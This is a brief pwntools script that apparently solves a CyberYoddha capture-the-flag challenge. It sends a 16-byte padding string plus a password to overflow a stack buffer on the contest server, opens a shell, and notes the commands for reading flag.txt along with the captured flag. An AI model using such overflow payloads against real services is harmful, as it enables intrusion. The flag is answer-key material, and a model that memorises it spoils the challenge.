from pwn import *
conn =remote("cyberyoddha.baycyber.net",10001)
conn.send("a"*16 + "ilovehackerdom"+'\n')
conn.interactive()
# ls 
# cat flag.txt
#CYCTF{st@ck_0v3rfl0ws_@r3_3z}
